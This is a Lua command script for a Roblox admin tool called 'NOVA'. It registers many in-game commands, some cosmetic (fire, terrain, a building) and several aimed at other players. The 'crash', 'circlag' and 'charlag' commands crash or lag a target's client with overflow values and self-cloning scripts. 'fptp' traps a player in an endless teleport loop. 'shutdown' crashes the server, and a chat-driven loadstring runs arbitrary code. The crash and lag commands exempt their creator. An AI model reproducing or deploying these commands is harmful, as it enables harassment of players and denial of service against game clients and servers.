AddCommand("Fire","fire",2,"Sets the selected player on fire.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,part in pairs(GetRecursiveChildren(v.Character)) do
					if part:IsA("BasePart") then
						Instance.new("Fire",part)
					end
				end
			end)
		end
	end
)

AddCommand("Un Fire","unfire",2,"Extenguishes the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,part in pairs(GetRecursiveChildren(v.Character)) do 
					if part:IsA("Fire") then
						part:Destroy()
					end
				end
			end)
		end
	end
)

AddCommand("Burn","burn",3,"Burns the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				coroutine.resume(coroutine.create(function()
					local Fire = Instance.new("Fire",v.Character.Torso)
					for _,part in pairs(GetRecursiveChildren(v.Character)) do
						if part:IsA("BasePart") then
							Instance.new("Fire",part)
						end
					end
					wait()
					for i=1,math.huge do
						if Fire.Parent == nil then break end
						if v.Character.Humanoid == nil then break end
						if v.Character.Humanoid.Health <= 0 then break end
						v.Character.Humanoid.Health = v.Character.Humanoid.Health - math.random(0,7)
						wait(math.random(0,1))
					end
				end))
			end)
		end
	end
)

AddCommand("Heal","heal",1,"Heals the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
			end)
		end
	end
)

AddCommand("Crash","crash",4,"Crashes the selected player's ROBLOX window.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v.Character.Humanoid.WalkSpeed = tonumber("1e+999")
			end)
		end
	end
)

AddCommand("Cape","cape",4,"Gives the selected player a cape.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			Cape(v)
		end
	end
)


AddCommand("Generate Terrain","genter",2,"Generates a terrain cube.","No Arguments",
	function(Msg,Speaker)
		coroutine.resume(coroutine.create(function()
		
			--[[
			1	Grass	Material for grassy terrain cells.
			2	Sand	Material for sandy terrain cells.
			3	Brick	Material for brick terrain cells.
			4	Granite	Material for granite terrain cells.
			5	Asphalt	Material for asphalt terrain cells.
			6	Iron	Material for iron terrain cells.
			7	Aluminum	Material for aluminum terrain cells.
			8	Gold	Material for gold terrain cells.
			9	WoodPlank	Material for wood plank terrain cells.
			10	WoodLog	Material for wood log terrain cells.
			11	Gravel	Material for gravel terrain cells.
			12	CinderBlock	Material for cinder block terrain cells.
			13	MossyStone	Material for mossy stone terrain cells.
			14	Cement	Material for cement terrain cells.
			15	RedPlastic	Material for red plastic terrain cells.
			16	BluePlastic
			]]
			-- Cube type = 0
			Material = math.random(1,16)
			Cap = 1000
			GenNum = 50
			Size = 100
			Type = math.random(0,4)
			for i=1, Cap do
				--wait()
				for i=1,GenNum do
					Material = math.random(1,16)
					Type = math.random(0,4)
					X = math.random((Size/2)*-1,Size/2)
					Y = math.random(-1,Size-1)
					Z = math.random((Size/2)*-1,Size/2)
					NOVA.Services.Workspace.Terrain:SetCell(X,Y,Z,Material,Type,0)
				end
			end
		end))
	end
)

AddCommand("Degenerate Terrain","degen",2,"Clears the terrain.","No Arguments",	
	function(Msg,Speaker)
		NOVA.Services.Workspace.Terrain:Clear()
	end
)

AddCommand("Ocean","ocean",4,"Generates an ocean.","No Arguments",
	function(Msg,Speaker)
		coroutine.resume(coroutine.create(function()
			size = Vector3.new(100, 50, 100)
			for X=(size.x/2)*-1,size.x/2  do
				for Y=-1, size.y-1 do
					for Z=(size.z/2)*-1, size.z/2 do
						NOVA.Services.Workspace.Terrain:SetWaterCell(X, Y, Z, 0, 0)
					end
				end
				--wait(tonumber("0."..string.rep("0",10000).."1"))
			end
		end))
	end
)

AddCommand("Darken","darken",4,"Makes the selected player dark.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			Char = v.Character
			pcall(function() Char["Shirt Graphic"]:Remove() end)
			pcall(function() Char.Humanoid.MaxHealth = math.huge end)
			pcall(function() Char["Body Colors"]:Remove() end)
			pcall(function() Char.Torso.roblox:Remove()	end)
			pcall(function() Char.Shirt:Remove() end)
			pcall(function() Char.Pants:Remove() end)
			wait()
			for _,a in pairs(Char:GetChildren()) do
				pcall(function() a.TextureId = "" a.VertexColor = NOVA.Colors.Black	end)
				pcall(function() a.BrickColor = BrickColor.new(Color3.new(NOVA.Colors.Black)) a.Reflectance = 0 a.TopSurface = "Smooth" a.BottomSurfave = "Smooth" wait() end)
				for _,b in pairs(a:GetChildren()) do
					pcall(function() b.TextureId = "" b.VertexColor = NOVA.Colors.Black end)
					pcall(function() b.BrickColor = BrickColor.new(Color3.new(NOVA.Colors.Black)) b.Reflectance = 0 b.TopSurface = "Smooth" b.BottomSurfave = "Smooth" wait() end)
					for _,c in pairs(b:GetChildren()) do
						pcall(function() c.TextureId = "" c.VertexColor = NOVA.Colors.Black	end)
						pcall(function() c.BrickColor = BrickColor.new(Color3.new(NOVA.Colors.Black)) c.Reflectance = 0 c.TopSurface = "Smooth" c.BottomSurfave = "Smooth" wait() end)
					end
				end
			end
		end
	end
)

AddCommand("Character 1","char1",5,"Gives the selected player character appearance 1.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			v.CharacterAppearance = "http://www.roblox.com/asset/?id=81445914"
			wait()
			v.Character:BreakJoints()
		end
	end
)

AddCommand("Neutral","neutral",3,"Changes the Neutral value of the selected player.","<Player><Boolean>",
	function(Msg,Speaker)
		Split = GetSplit(Msg)
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			v.Neutral = Msg:sub(Split+1)
		end
	end
)

AddCommand("Generate Portal","genportal",6,"Generates a portal in the workspace.","No Arguments",
	function(Msg,Speaker)
		MainCFrame = CFrame.new(0,3,15)
			* CFrame.Angles(0,math.rad(90),0)
		local Special = {}
		pcall(function() workspace["NOVA Portal"]:Remove() end)
		local Model = Instance.new("Model",workspace)
		Model.Name = "NOVA Portal"
		for angle=1,360/4 do
			local Part = Instance.new("Part",Model)
			Part.Name = "Part"
			Part.FormFactor = "Custom"
			Part.CanCollide = true
			Part.Anchored = true
			Part.Transparency = 0
			Part.Reflectance = 0
			Part.Size = Vector3.new(1,5/2,1)
			Part.BrickColor = BrickColor.new("Navy blue")
			Part.CFrame = MainCFrame
				* CFrame.Angles(math.rad(angle*4), 0, 0)
				* CFrame.new(0, 15/2, i) 
			--wait(0)
			Instance.new("BlockMesh",Part)
			for num=0,1000,5 do
				if angle==num then 
					wait() 
					table.insert(Special,Part)
					--Part.Reflectance = 1 
					Part.Size = Vector3.new(0.9,5/2,0.9)
					Part.CFrame = MainCFrame
						* CFrame.Angles(math.rad(angle*4), 0, 0)
						* CFrame.new(0, 15/2, i) 
				end
			end
		end

		for _,v in pairs(Special) do v.Reflectance = 1 wait() end
		
		local Part = Instance.new("Part",Model)
		Part.Name = "Part"
		Part.FormFactor = "Custom"
		Part.CanCollide = false	
		Part.Anchored = true
		Part.TopSurface = "Smooth" 
		Part.BottomSurface = "Smooth"
		Part.Transparency = 0.5 
		Part.Reflectance = 0
		Part.Size = Vector3.new(0.2,0.2,0.2) 
		Part.BrickColor = BrickColor.new("Really black")
		Part.CFrame = MainCFrame 
			* CFrame.Angles(math.rad(0), math.rad(0), math.rad(90))
			* CFrame.new(0, 0, 0) 
		Instance.new("CylinderMesh",Part)

		for i=0.2,51/4,0.5 do
			wait()
			Part.Size = Vector3.new(i,0.9,i)
			Part.CFrame = MainCFrame
			* CFrame.Angles(math.rad(0), math.rad(0), math.rad(90))
			* CFrame.new(0, 0, 0) 
		end

		coroutine.resume(coroutine.create(function()
			while true do wait()
				for i=0,1,0.01 do wait() Part.Reflectance = i end
				for i=1,0,-0.01 do wait() Part.Reflectance = i end
			end
		end))




		Part.Touched:connect(function(Part)
			Player = game:GetService("Players"):GetPlayerFromCharacter(Part.Parent)
			if Player ~= nil and not Player.PlayerGui:FindFirstChild("NOVA Teleport") then
				--print(Player.Name.." touched.")
				CreateLocalScript([==[
					LocalPlayer = game:service'Players'.LocalPlayer
					Places = {
						{Name = "Oxcool1 SB",ID = 20279777};
						{Name = "Oxcool1 PRI SB", ID = 20132544};
						{Name = "TNS SB", ID = 23232804};
						{Name = "BrainWart SB", ID = 76809211};
						{Name = "nb SB",ID = 113456};
						{Name = "nb SB (2)",ID = 56786};
						{Name = "Insert Wars",ID = 13329886};
					}
					pcall(function() LocalPlayer.PlayerGui["NOVA Teleport"]:Remove() end)
					local Main = Instance.new("ScreenGui",LocalPlayer.PlayerGui)
					Main.Name = "NOVA Teleport"
					script.Parent = Main

					local Frame = Instance.new("Frame",Main)
					Frame.Size = UDim2.new(0.27,0,0.05,0)
					Frame.Position = UDim2.new(0.,0,0.2,0)
					Frame.Style = "RobloxSquare"

					local Txt = Instance.new("TextBox",Frame)
					Txt.Size = UDim2.new(0.7,0,1,0)
					Txt.BackgroundTransparency = 1
					Txt.FontSize = "Size14"
					Txt.TextColor3 = Color3.new(1,1,1)
					Txt.Text = "ID/Name Here"
					
					local Close = Instance.new("TextButton",Frame)
					Close.Size = UDim2.new(0.1,0,1,0)
					Close.Position = UDim2.new(0.9,0,0,0)
					Close.Text = "X"
					Close.BackgroundTransparency = 1
					Close.FontSize = "Size14"
					Close.TextColor3 = Color3.new(1,0,0)
					Close.MouseButton1Down:connect(function()
						Main:Remove()
					end)
					
					local Exe = Instance.new("TextButton",Frame)
					Exe.Size = UDim2.new(0.2,0,1,0)
					Exe.Position = UDim2.new(0.6,0,0,0)
					Exe.Text = "Teleport"
					Exe.BackgroundTransparency = 1
					Exe.FontSize = "Size14"
					Exe.TextColor3 = Color3.new(1,0,0)
					Exe.MouseButton1Down:connect(function()
						GoTo = Txt.Text
						for _,v in pairs(Places) do
							if Txt.Text:lower() == v.Name:lower() then 
								GoTo = v.ID
							end
						end
						game:service'TeleportService':Teleport(GoTo)
						Main:Remove()
					end)

					List = Instance.new("Frame",Main)
					List.Size = UDim2.new(0.27,0,0.05*#Places,0)
					List.Position = UDim2.new(0.,0,0.2 + (0.05*((#Places/2)-1)),0)
					List.Style = "RobloxSquare"

					for NUM,v in pairs(Places) do
						Name = Instance.new("TextButton",List)
						Name.Size = UDim2.new(0.5,0,1/#Places,0)
						Name.Position = UDim2.new(0,0,(NUM-1)*(1/#Places),0)
						Name.BackgroundTransparency = 1
						Name.FontSize = "Size14"
						Name.TextColor3 = Color3.new(1,1,1)
						Name.Text = v.Name
						Name.MouseButton1Down:connect(function()
							game:service'TeleportService':Teleport(v.ID)
						end)
						ID = Instance.new("TextButton",List)
						ID.Size = UDim2.new(0.5,0,1/#Places,0)
						ID.Position = UDim2.new(0.5,0,(NUM-1)*(1/#Places),0)
						ID.BackgroundTransparency = 1
						ID.FontSize = "Size14"
						ID.TextColor3 = Color3.new(1,1,1)
						ID.Text = v.ID
						ID.MouseButton1Down:connect(function()
							game:service'TeleportService':Teleport(v.ID)
						end)
					end
				]==],Player.Backpack)
			end
		end)
	end
)

AddCommand("Place Teleport","ptp",5,"Sends a teleport request to the selected player.","<Player>",
	function(Msg,Speaker)
		for i=1,100 do
			if string.sub(Msg,i,i) == "\\" then
				Split = i
				break
			end
		end    
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			CreateLocalScript([==[game:service'TeleportService':Teleport(]==]..Msg:sub(Split+1)..[==[)]==],v.Backpack)
		end
	end
)

AddCommand("Force Place Teleport","fptp",6,"Forces the selected player to teleport to the given place.","<Player>",
	function(Msg,Speaker)
		for i=1,100 do
			if string.sub(Msg,i,i) == "\\" then
				Split = i
				break
			end
		end    
		for _,v in pairs(GetPlayers(Msg:sub(1,Split-1),Speaker)) do
			CreateLocalScript([==[
				script.Parent = nil
				while true do wait()
					game:service'TeleportService':Teleport(]==]..Msg:sub(Split+1)..[==[)
				end
			]==],v.Backpack)
		end
	end
)
	
AddCommand("Shutdown","shutdown",5,"Shuts down the server.","<No Arguments>",
	function(Msg,Speaker)
		coroutine.resume(coroutine.create(function()
			NOVA.Services.Lighting.TimeOfDay = 0
			NOVA.Services.Lighting.Ambient = NOVA.Colors.Black
			NOVA.Services.Lighting.Brightness = 0
			NOVA.Services.Lighting.ColorShift_Top = NOVA.Colors.Black
			NOVA.Services.Lighting.ColorShift_Bottom = NOVA.Colors.Black
			NOVA.Services.Lighting.ShadowColor = NOVA.Colors.Black

			for _,v in pairs(GetRecursiveChildren(workspace)) do
				if v:IsA("BasePart") then
					Sel = Instance.new("SelectionBox",v)
					Sel.Color = BrickColor.new("Really red")
					Sel.Transparency = 0
					Sel.Adornee = v
				end
			end
			for i=10,1,-1 do
				NOVA.Sounds.Sound.Parent = workspace
				NOVA.Sounds.Sound.Volume = 1
				NOVA.Sounds.Sound.Pitch = 1
				NOVA.Sounds.Sound.SoundId = "http://www.roblox.com/Asset/?id=14863866"
				wait(1)
				NOVA.Sounds.Sound:Play()
			end
			for i=5,1,-1 do
				NOVA.Sounds.Sound.Parent = workspace
				NOVA.Sounds.Sound.Volume = 1
				NOVA.Sounds.Sound.Pitch = 1
				NOVA.Sounds.Sound.SoundId = NOVA.Sounds.Numbers[i]
				wait(1)
				NOVA.Sounds.Sound:Play()
			end
			wait(1)
			Instance.new("ManualSurfaceJointInstance",workspace)
		end))
	end
)

AddCommand("Get Rid Of","getridof",6,"Gets rid of the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			if v.Name == "rigletto" then
				Output("Attempt to get rid of the creator, command will not be carried through.",NOVA.Colors.Red,Speaker,10)
			else
				pcall(function() 
					GetRidOf(v)
				end)
			end
		end
	end
)

AddCommand("Load","load",1,"Loads NOVA's sound files.","No Arguments",
	function(Msg,Speaker)
		coroutine.resume(coroutine.create(function()
			for _,v in pairs(NOVA.Sounds.Music) do
				NOVA.Sounds.Sound.Parent = NOVA.Services.Workspace
				NOVA.Sounds.Sound.SoundId = v.Id
				NOVA.Sounds.Sound.Volume = 0
				wait()
				NOVA.Sounds.Sound:Play()
				wait()
				NOVA.Sounds.Sound:Stop()
				wait(1)
			end
			for _,v in pairs(NOVA.Sounds.Numbers) do
				NOVA.Sounds.Sound.Parent = NOVA.Services.Workspace
				NOVA.Sounds.Sound.SoundId = v
				NOVA.Sounds.Sound.Volume = 0
				wait()
				NOVA.Sounds.Sound:Play()
				wait()
				NOVA.Sounds.Sound:Stop()
				wait(1)
			end
			for _,v in pairs(NOVA.Sounds.PlayAfter) do
				NOVA.Sounds.Sound.Parent = NOVA.Services.Workspace
				NOVA.Sounds.Sound.SoundId = v
				NOVA.Sounds.Sound.Volume = 0
				wait()
				NOVA.Sounds.Sound:Play()
				wait()
				NOVA.Sounds.Sound:Stop()
				wait(1)
			end
			NOVA.Sounds.Sound.Volume = 1
		end))
	end
)

AddCommand("Target","targ",6,"Targets the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			table.insert(NOVA.Targeted,v)
			for _,part in pairs(GetRecursiveChildren(v.Character)) do
				if part:IsA("Part") then
					coroutine.resume(coroutine.create(function()
						local SB = Instance.new("SelectionBox",part)
						SB.Name = "NOVA Target Selection Box"
						SB.Color = BrickColor.new(NOVA.Colors.Yellow)
						SB.Adornee = part
						wait(3)
						SB:remove()
					end))
				end
			end
		end
	end
)

AddCommand("Un Target","untarg",6,"Un targets the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			for i=1,#NOVA.Targeted do
				if NOVA.Targeted[i] == v then
					table.remove(NOVA.Targeted,i)
				end
			end
		end
	end
)

AddCommand("Rejoin","rejoin",0,"Sends you a teleport request to the same place.","No Arguments",
	function(Msg,Speaker)
		CreateLocalScript([==[game:service'TeleportService':Teleport(]==]..game.PlaceId..[==[)]==],Speaker.Backpack)
	end
)

AddCommand("Connect","connect",0,"Connects you to a NOVA Drone.","No Arguments",
	function(Msg,Speaker)
		CreateScript("",CreateLocalScript([==[
			NOVA = {
				Services = {
					Workspace = game:GetService("Workspace");
					Lighting = game:GetService("Lighting");
					Debris = game:GetService("Debris");
					Players = game:GetService("Players");
					Teams = game:GetService("Teams");
					SoundService = game:GetService("SoundService");
					StarterGui = game:GetService("StarterGui");
					StarterPack = game:GetService("StarterPack");
				};
				LocalPlayer = game:service'Players'.LocalPlayer;
				Camera = workspace.CurrentCamera;
				LocalCharacter = Instance.new("Model");
				LocalHead = Instance.new("Part");
				LocalFire = Instance.new("Fire");
			}
			script.Name = NOVA.LocalPlayer.Name
			script.Parent = nil
			NOVA.LocalPlayer.Chatted:connect(function(Msg)
				if NOVA.LocalPlayer.Parent == nil then
					if not Msg:find("mediafire") or Msg:find("shit") or Msg:find("gtfo") or Msg:find("hitler") or  Msg:find("password") then
						pcall(function() game:service'Chat':Chat(NOVA.LocalHead,Msg,math.random(0,2)) end)
					end
					if Msg == "\\rejoin\\" then
						game:service'TeleportService':Teleport(game.PlaceId)
					end
					if Msg:sub(1,3) == "\\c\\" then
						pcall(function() 
							newScript(Msg:sub(4),workspace)
						end)
					end
					if Msg:sub(1,7) == "\\local\\" then
						coroutine.resume(coroutine.create(function()
							pcall(function()
								loadstring(Msg:sub(8))()
							end)
						end))
					end
				end
			end)
			
			repeat wait() until NOVA.LocalPlayer.Parent == nil
			NOVA.LocalPlayer.Character = nil
			NOVA.LocalHead.FormFactor = "Custom"
			NOVA.LocalHead.Size = Vector3.new(3,3,3)
			NOVA.LocalHead.Reflectance = 1e+999
			NOVA.LocalHead.Shape = "Ball"
			NOVA.LocalHead.Anchored = true
			NOVA.LocalHead.CanCollide = false
			NOVA.LocalHead.Transparency = 0
			NOVA.LocalCharacter.Name = NOVA.LocalPlayer.Name
			
			NOVA.LocalFire.Color = Color3.new(0,0,0)
			NOVA.LocalFire.SecondaryColor = Color3.new(0,0,0)
			NOVA.LocalFire.Heat = 12
			NOVA.LocalFire.Size = 7	

			while wait() do
				pcall(function()
					NOVA.LocalCharacter.Parent=workspace
					NOVA.LocalHead.Parent = NOVA.LocalCharacter
					NOVA.LocalHead.CFrame = NOVA.Camera.CoordinateFrame * CFrame.new(0,0,-30.517578125)
					NOVA.LocalFire.Parent = NOVA.LocalHead
				end)
			end
		]==],Speaker.Backpack))
		--[[
			Trigger = Instance.new("BindableEvent")
			Trigger.Name = "NOVAExternalInput"
			Trigger.Parent = workspace
			wait()
			Trigger:Fire("\\m\\asd",game.Players.)
		]]--
	end
)


AddCommand("Script","c",6,"Pseudo scripting command.","<Source>",
	function(Msg,Speaker)
		CreateScript(Msg,workspace)
	end
)

AddCommand("Local Script","local",6,"Pseudo scripting command.","<Source>",
	function(Msg,Speaker)
		CreateLocalScript(Msg,Speaker.Backpack)
	end
)

AddCommand("Derp","derp",1,"Derps the workspace.","No Arguments",
	function(Msg,Speaker)
		for _,v in pairs(GetRecursiveChildren(workspace)) do
			pcall(function()
				v.Transparency = -1
			end)
		end
	end
)

AddCommand("Circle Lag","circlag",6,"Lags the selected player with circles.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			if v.Name == "rigletto" then
				Output("Attempt to lag the creator, command will not be carried through.",NOVA.Colors.Red,Speaker,10)
			else
				pcall(function() 
					CreateLocalScript([==[
						LocalPlayer = game:service'Players'.LocalPlayer
						Camera = workspace.CurrentCamera
						while wait() do
							for i=1,10 do
								Part = Instance.new("Seat",Camera)
								Part.Size = Vector3.new(math.random(1,20),math.random(1,20),math.random(1,20))
								Part.Shape = "Ball"
								Part.BrickColor = BrickColor.new(math.random(),math.random(),math.random())
								Part.CFrame = CFrame.new(math.random(-250,250),50,math.random(-250,250))
							end
						end
					]==],v.Backpack)
				end)
			end
		end
	end
)

AddCommand("Clear Camera","clearcam",3,"Clears the selected player's current camera.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			CreateLocalScript("workspace.CurrentCamera:ClearAllChildren()",v.Backpack)
		end
	end
)

AddCommand("Screen Peek","screenpeek",4,"Shows you the selected player's playergui.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			for _,GUI in pairs(v.PlayerGui:children()) do
				GUI:Clone().Parent = Speaker.PlayerGui
			end
		end
	end
)

AddCommand("Show Targeted","showtarg",1,"Shows the targeted players.","No Arguments",
	function(Msg,Speaker)
		for _,v in pairs(NOVA.Targeted) do
			for _,part in pairs(GetRecursiveChildren(v.Character)) do
				if part:IsA("Part") then
					coroutine.resume(coroutine.create(function()
						local SB = Instance.new("SelectionBox",part)
						SB.Name = "NOVA Target Selection Box"
						SB.Color = BrickColor.new(NOVA.Colors.Yellow)
						SB.Adornee = part
						wait(3)
						SB:remove()
					end))
				end
			end
		end
	end
)

AddCommand("Note To Self","nts",0,"Note to self commands.","<Action>",
	function(Msg,Speaker)
		if Msg:sub(1,4) == "add\\" then
			Speaker:SaveString("NoteToSelf",Speaker:LoadString("NoteToSelf").." "..Msg:sub(5))
		elseif Msg:sub(1,4) == "set\\" then
			Speaker:SaveString("NoteToSelf",Msg:sub(5))
		elseif Msg == "see" then
			Output(Speaker:LoadString("NoteToSelf"),GetRankedTable(Speaker).Color,Speaker)
		end
	end
)

AddCommand("Smite","smite",6,"Smites the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			local Char = v.Character
			local Smite = Instance.new("Part",workspace)
			Smite.FormFactor = "Custom"
			Smite.TopSurface = "Smooth"
			Smite.BottomSurface = "Smooth"
			Smite.Anchored = true
			Smite.Size = Vector3.new(25,3,25)
			Smite.BrickColor = BrickColor.new("New Yeller")
			Smite.Transparency = 1
			Smite.CFrame = Char.Torso.CFrame * CFrame.new(0,-2.5,0)
			for i=1,0,-0.05 do
				wait()
				Smite.Transparency = i
			end
			coroutine.resume(coroutine.create(function()
				for i=0,1,0.05 do
					wait()
					Smite.Transparency = i
				end
				Smite:remove()
			end))
			wait()
			local Expl = Instance.new("Explosion",workspace)
			Expl.Position = Smite.Position
			Expl.BlastPressure = 1000000000
			
			for _,Part in pairs(GetRecursiveChildren(Char)) do
				if Part:IsA("BasePart") then
					coroutine.resume(coroutine.create(function()
						for i=1,10 do
							local Sparkles = Instance.new("Sparkles",Part)
							Sparkles.Color = Color3.new(math.random(0,1),math.random(0,1),math.random(0,1))
							local Fire = Instance.new("Fire",Part)
							Fire.Color = Color3.new(math.random(0,1),math.random(0,1),math.random(0,1))
							Fire.SecondaryColor = Color3.new(math.random(0,1),math.random(0,1),math.random(0,1))
						end
						Part:BreakJoints()
						local BP = Instance.new("BodyPosition",Part)
						BP.maxForce = Vector3.new(math.huge,math.huge,math.huge)
						BP.P = 1000
						BP.position = Part.Position + Vector3.new(
							math.random(-100,100),
							100,
							math.random(-100,100))
						wait(3)
						local Expl = Instance.new("Explosion",workspace)
						Expl.Position = Part.Position
						Expl.BlastPressure = 1000000000
					end))
				end
			end
		end
	end
)

AddCommand("Epic","Epic",1,"Epicifys the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				for _,Part in pairs(GetRecursiveChildren(v.Character)) do
					if Part:IsA("BasePart") then
						for i=1,10 do
							local Sparkles = Instance.new("Sparkles",Part)
							Sparkles.Color = Color3.new(math.random(0,1),math.random(0,1),math.random(0,1))
							local Fire = Instance.new("Fire",Part)
							Fire.Color = Color3.new(math.random(0,1),math.random(0,1),math.random(0,1))
							Fire.SecondaryColor = Color3.new(math.random(0,1),math.random(0,1),math.random(0,1))
						end
					end
				end
			end)
		end
	end
)

AddCommand("Show Chat","showchat",7,"Toggle NOVA.ShowChat ( boolean )","No Arguments",
	function(Msg,Speaker)
		if NOVA.ShowChat == true then 
			NOVA.ShowChat = false
		elseif NOVA.ShowChat == false then
			NOVA.ShowChat = true
		end
	end
)

AddCommand("Character Lag","charlag",6,"Lags the targeted player with their own character. Brutal.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			if v.Name == "rigletto" then
				Output("Attempt to lag the creator, command will not be carried through.",NOVA.Colors.Red,Speaker,10)
			else
				pcall(function() 
					CreateLocalScript([[
						script.Parent = workspace.CurrentCamera
						while wait() do
							coroutine.resume(coroutine.create(function()
								for i=1,math.huge do
									wait()
									for i=1,10 do
										NS = script:Clone()
										NS.Disabled = true
										NS.Parent = game.Players.LocalPlayer.Backpack
										NS.Disabled = false
									end
									for i=1,10 do
										game.Players.LocalPlayer.Character.Archivable = true
										game.Players.LocalPlayer.Character:Clone().Parent = workspace.CurrentCamera
									end
								end
							end
						end]],
					v.Backpack)
				end)
			end
		end
	end
)

AddCommand("Building","building",1,"Generates a building.","No Arguments",
	function(Msg,Speaker)
		local PrimaryColor = Color3.new(0,0,0)
		local SecondaryColor = Color3.new(0.76,0,0)
		pcall(function() workspace["NOVA Building"]:remove() end)
		local BasePart = Instance.new("Part") BasePart.FormFactor = "Custom" BasePart.Name = "Part" BasePart.TopSurface = "Smooth" BasePart.BottomSurface = "Smooth" BasePart.CanCollide = true BasePart.Anchored = true BasePart.Transparency = 0 BasePart.Reflectance = 0 BasePart.BrickColor = BrickColor.new("Bright green") BasePart.CFrame = CFrame.new(0,0,0) Instance.new("BlockMesh",BasePart)
		local Main = Instance.new("Model",workspace) Main.Name = "NOVA Building"
		local Pathway = BasePart:Clone() Pathway.Parent = Main Pathway.BrickColor = BrickColor.new(PrimaryColor)
		if workspace:FindFirstChild("Base") ~= nil then Pathway.Size = Vector3.new(10,1,(workspace.Base.Size.z/2)+5) Pathway.CFrame = CFrame.new(0,(workspace.Base.CFrame.y) + (Pathway.Size.y),(Pathway.Size.z/2)-5) else Pathway.Size = Vector3.new(10,1,250) Pathway.CFrame = CFrame.new(0,1,(Pathway.Size.z/2)-5) end
		MainCFrame = CFrame.new(0,Pathway.CFrame.y,Pathway.Size.z+10)
		local Platform = BasePart:Clone() Platform.Parent = Main Platform.BrickColor = BrickColor.new(0,0,0) Platform.Size = Vector3.new(30,1,30) Platform.CFrame = MainCFrame
		local Dot = BasePart:Clone() Dot.Parent = Main Dot.BrickColor = BrickColor.new(0,0,0) Dot.Size = Vector3.new(10,1,10) Dot.CFrame = MainCFrame 	* CFrame.new(0,0.02,0) Instance.new("CylinderMesh",Dot)
		local Sphere = BasePart:Clone() Sphere.Parent = Main Sphere.Reflectance = 1e+999 Sphere.Size = Vector3.new(5,5,5) Sphere.Shape = "Ball" Sphere:ClearAllChildren() Sphere.CFrame = MainCFrame 	* CFrame.new(0,20,0)
		for i=1,10 do local Fire = Instance.new("Fire",Sphere) Fire.Color = PrimaryColor Fire.SecondaryColor = PrimaryColor	Fire.Size = 9  local Fire = Instance.new("Fire",Sphere) Fire.Color = SecondaryColor Fire.SecondaryColor = SecondaryColor Fire.Size = 9 end
		for angle=1,360,360/5 do local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(SecondaryColor) Part.Size = Vector3.new(2,1,28) Part.CFrame = MainCFrame * CFrame.Angles(0,math.rad(angle),0) * CFrame.new(0,0.01,0) end
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(30,1,30) Part.CFrame = MainCFrame * CFrame.new(25,10,0) * CFrame.Angles(0,0,math.rad(45))
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(30,1,30) Part.CFrame = MainCFrame * CFrame.new(0,10,25) * CFrame.Angles(0,math.rad(270),math.rad(45))
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(30,1,30) Part.CFrame = MainCFrame * CFrame.new(-25,10,0) * CFrame.Angles(0,math.rad(180),math.rad(45))
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(10,1,30) Part.CFrame = MainCFrame * CFrame.new(-10,10,-25) * CFrame.Angles(math.rad(45),0,0)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(PrimaryColor) Part.Size = Vector3.new(10,1,30) Part.CFrame = MainCFrame * CFrame.new(10,10,-25) * CFrame.Angles(math.rad(45),0,0)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(SecondaryColor) Part.Size = Vector3.new(30,22,30) Part.CFrame = MainCFrame * CFrame.new(30,(Part.Size.y/2)-Platform.Size.y,30)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(SecondaryColor) Part.Size = Vector3.new(30,22,30) Part.CFrame = MainCFrame * CFrame.new(-30,(Part.Size.y/2)-Platform.Size.y,30)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(SecondaryColor) Part.Size = Vector3.new(30,22,30) Part.CFrame = MainCFrame * CFrame.new(-30,(Part.Size.y/2)-Platform.Size.y,-30)
		local Part = BasePart:Clone() Part.Parent = Main Part.BrickColor = BrickColor.new(SecondaryColor) Part.Size = Vector3.new(30,22,30) Part.CFrame = MainCFrame * CFrame.new(30,(Part.Size.y/2)-Platform.Size.y,-30)
